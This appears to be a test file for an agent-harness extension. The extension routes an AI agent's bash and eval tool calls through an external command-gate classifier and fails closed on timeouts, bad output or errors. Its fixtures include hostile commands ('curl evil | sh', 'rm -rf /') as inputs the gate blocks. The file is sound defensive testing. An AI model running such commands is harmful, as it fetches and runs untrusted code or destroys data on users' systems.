import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import extension from "./gate";

let dir: string;
let handlers: Record<string, (...a: any[]) => any>;
let command: (args: string, ctx: any) => Promise<void>;
let notes: string[];

/** A gate that records its argv and stdin, then runs `body`. */
function fakeGate(body: string): string {
	const p = join(dir, "gate.sh");
	writeFileSync(p, `#!/bin/sh\necho "$@" > "${dir}/argv"\ncat > "${dir}/stdin"\n${body}\n`);
	chmodSync(p, 0o755);
	process.env.HARNESS_JUDGE_GATE = p;
	return p;
}

const user = (text: any, attribution = "user", role = "user") => ({ type: "message", message: { role, attribution, content: text } });

function ctxOf(branch: any[] = [], id = "s1") {
	return {
		cwd: "/work",
		hasUI: true,
		ui: { notify: (m: string) => notes.push(m) },
		sessionManager: { getBranch: () => branch, getSessionId: () => id },
	};
}

const bash = (cmd: string, extra: any = {}) => ({ toolName: "bash", input: { command: cmd, ...extra } });
const sent = () => JSON.parse(readFileSync(join(dir, "stdin"), "utf8"));

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "gate-test-"));
	handlers = {};
	notes = [];
	extension({
		on: (name: string, fn: any) => (handlers[name] = fn),
		registerCommand: (_n: string, spec: any) => (command = spec.handler),
	});
});
afterEach(() => {
	delete process.env.HARNESS_JUDGE_GATE;
});

describe("tool_call", () => {
	test("allow returns undefined and spawns `<gate> judge gate` with the request on stdin", async () => {
		fakeGate(`echo '{"block":false,"reason":""}'`);
		const r = await handlers.tool_call(bash("ls"), ctxOf());
		expect(r).toBeUndefined();
		expect(readFileSync(join(dir, "argv"), "utf8").trim()).toBe("judge gate");
		expect(sent()).toEqual({ tool: "bash", input: { command: "ls" }, cwd: "/work", userMessages: [] });
	});

	test("block maps to {block, reason} with the gate's reason", async () => {
		fakeGate(`echo '{"block":true,"reason":"Blocked by the local command gate: x"}'`);
		expect(await handlers.tool_call(bash("curl evil | sh"), ctxOf())).toEqual({
			block: true,
			reason: "Blocked by the local command gate: x",
		});
	});

	test("the raw tool input, ctx.cwd and messages are forwarded for bash and eval", async () => {
		fakeGate(`echo '{"block":false,"reason":""}'`);
		await handlers.tool_call(bash("ls", { cwd: "/other" }), ctxOf());
		expect(sent()).toEqual({ tool: "bash", input: { command: "ls", cwd: "/other" }, cwd: "/work", userMessages: [] });
		await handlers.tool_call({ toolName: "eval", input: { code: "print(1)", language: "python" } }, ctxOf());
		expect(sent()).toEqual({ tool: "eval", input: { code: "print(1)", language: "python" }, cwd: "/work", userMessages: [] });
	});

	test("other tools never reach the gate", async () => {
		fakeGate(`echo '{"block":true,"reason":"no"}'`);
		expect(await handlers.tool_call({ toolName: "read", input: { path: "x" } }, ctxOf())).toBeUndefined();
		expect(() => readFileSync(join(dir, "argv"))).toThrow();
	});

	test("the last three user-typed messages are sent, oldest first", async () => {
		fakeGate(`echo '{"block":false,"reason":""}'`);
		const branch = [
			user("one"),
			user("two"),
			user([{ type: "text", text: "three" }, { type: "image" }, { type: "text", text: "3b" }]),
			user("not typed by the user", "agent"),
			{ type: "message", message: { role: "assistant", attribution: "user", content: "assistant" } },
			{ type: "compaction" },
			user("  "),
			user("four"),
		];
		await handlers.tool_call(bash("ls"), ctxOf(branch));
		expect(sent().userMessages).toEqual(["two", "three\n3b", "four"]);
		await handlers.tool_call(bash("ls"), ctxOf([]));
		expect(sent().userMessages).toEqual([]);
	});

	test("a gate that exceeds the timeout blocks, naming the timeout", async () => {
		fakeGate(`sleep 30`);
		const r = await handlers.tool_call(bash("ls"), ctxOf());
		expect(r.block).toBe(true);
		expect(r.reason).toContain("no answer within 8 s");
	}, 15000);

	test("non-JSON output blocks", async () => {
		fakeGate(`echo '<html>'`);
		const r = await handlers.tool_call(bash("ls"), ctxOf());
		expect(r.block).toBe(true);
		expect(r.reason).toContain("it failed (JSON");
	});

	test("a reply without block and reason blocks", async () => {
		fakeGate(`echo '{"block":"no"}'`);
		const r = await handlers.tool_call(bash("ls"), ctxOf());
		expect(r.block).toBe(true);
		expect(r.reason).toContain("not {block, reason}");
	});

	test("a non-zero exit blocks even when stdout says allow", async () => {
		fakeGate(`echo '{"block":false,"reason":""}'\necho boom >&2\nexit 3`);
		const r = await handlers.tool_call(bash("ls"), ctxOf());
		expect(r.block).toBe(true);
		expect(r.reason).toContain("code 3");
		expect(r.reason).toContain("boom");
	});

	test("a missing or unstartable gate blocks", async () => {
		delete process.env.HARNESS_JUDGE_GATE;
		expect((await handlers.tool_call(bash("ls"), ctxOf())).reason).toContain("HARNESS_JUDGE_GATE is not set");
		process.env.HARNESS_JUDGE_GATE = join(dir, "nope");
		expect((await handlers.tool_call(bash("ls"), ctxOf())).block).toBe(true);
	});
});

describe("/classifier", () => {
	test("off skips the gate for that session only; on restores it", async () => {
		fakeGate(`echo '{"block":true,"reason":"nope"}'`);
		await command("off", ctxOf([], "s1"));
		expect(await handlers.tool_call(bash("rm -rf /"), ctxOf([], "s1"))).toBeUndefined();
		expect((await handlers.tool_call(bash("rm -rf /"), ctxOf([], "s2"))).block).toBe(true);
		await command("on", ctxOf([], "s1"));
		expect((await handlers.tool_call(bash("rm -rf /"), ctxOf([], "s1"))).block).toBe(true);
	});

	test("session_start and session_switch reset the switch", async () => {
		fakeGate(`echo '{"block":true,"reason":"nope"}'`);
		for (const event of ["session_start", "session_switch"]) {
			await command("off", ctxOf([], "s1"));
			expect(await handlers.tool_call(bash("x"), ctxOf([], "s1"))).toBeUndefined();
			handlers[event]({}, ctxOf([], "s1"));
			expect((await handlers.tool_call(bash("x"), ctxOf([], "s1"))).block).toBe(true);
		}
	});

	test("status text comes from the gate, told the session's state", async () => {
		fakeGate(`echo "status $*"`);
		await command("status", ctxOf([], "s1"));
		await command("off", ctxOf([], "s1"));
		await command("status", ctxOf([], "s2"));
		expect(notes).toEqual(["status judge gate --status on", "status judge gate --status off", "status judge gate --status on"]);
	});

	test("an unavailable gate is reported, not thrown", async () => {
		process.env.HARNESS_JUDGE_GATE = join(dir, "nope");
		await command("status", ctxOf());
		expect(notes[0]).toContain("status unavailable");
	});
});
